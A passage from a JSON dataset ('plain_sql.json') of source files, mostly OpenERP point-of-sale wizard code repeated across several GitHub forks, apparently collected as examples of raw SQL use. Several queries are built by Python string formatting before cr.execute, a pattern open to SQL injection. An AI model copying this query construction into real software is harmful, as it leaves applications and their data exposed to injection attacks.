meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef check_sort_by_table(self, order_by):\n\t\tif \".\" in order_by:\n\t\t\ttbl = order_by.split('.')[0]\n\t\t\tif tbl not in self.tables:\n\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/loxoalia/OCA-OCB/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/loxoalia/OCA-OCB/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/frouty/odoogoeen/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/frouty/odoogoeen/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cmorisse/openerp7/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cmorisse/openerp7/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/OSSESAC/odoopubarquiluz/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
